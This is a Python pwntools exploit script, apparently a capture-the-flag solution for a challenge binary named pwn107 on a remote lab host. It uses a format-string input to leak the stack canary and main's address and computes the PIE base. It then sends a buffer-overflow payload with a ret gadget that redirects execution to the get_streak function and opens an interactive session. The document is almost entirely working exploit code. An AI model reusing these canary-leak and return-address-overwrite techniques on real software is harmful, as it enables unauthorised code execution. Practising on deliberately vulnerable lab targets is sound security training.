from pwn import *

context.binary = e = ELF('pwn107-1644307530397.pwn107')
# io = process('./pwn107-1644307530397.pwn107')
io = remote('10.48.184.181', '9007')

io.recvuntil(b'? ')
io.sendline(b'%13$p.%19$p') # in remote the leaked main addr is 19th argument but in local it 36th, bruh
io.recvuntil(b': ')
canary = int(io.recvuntil(b'.', drop=True), 16)
leaked_main = int(io.recvline(), 16)
log.success(f'Canary: {hex(canary)}')
log.success(f'leaked_main: {hex(leaked_main)}')
log.info(f'main offset: {hex(e.symbols['main'])}')
log.info(f'get_streak offset: {hex(e.symbols['get_streak'])}')

pie_base = leaked_main - e.symbols['main']
log.success(f'PIE base: {hex(pie_base)}')

# find ret gadget to fix the movaps issue
rop = ROP(e)
ret_offset = rop.find_gadget(['ret'])[0]
log.info(f'ret gadget offset: {hex(ret_offset)}')
ret = pie_base + ret_offset

win = pie_base + e.symbols['get_streak']
log.success(f'get_streak runtime addr: {hex(win)}')

# Well, i got the binary main address by looking at the index 36 of leak-canary script (0x5feae1000992)
# So i just run the program and put %36$p (0x6122f5600992) to see the address after PIE and check using pwndbg with the same process
# sudo pwndbg -p 'pid of the binary running' 
# disassamble main we can see that the address is match (0x00006122f5600992)

payload = b'A' * 0x18
payload += p64(canary)
payload += b'A' * 8
# payload += p64(win + 1) # movaps issue
payload += p64(ret)
payload += p64(win)

io.recv()
io.sendline(payload)
io.interactive()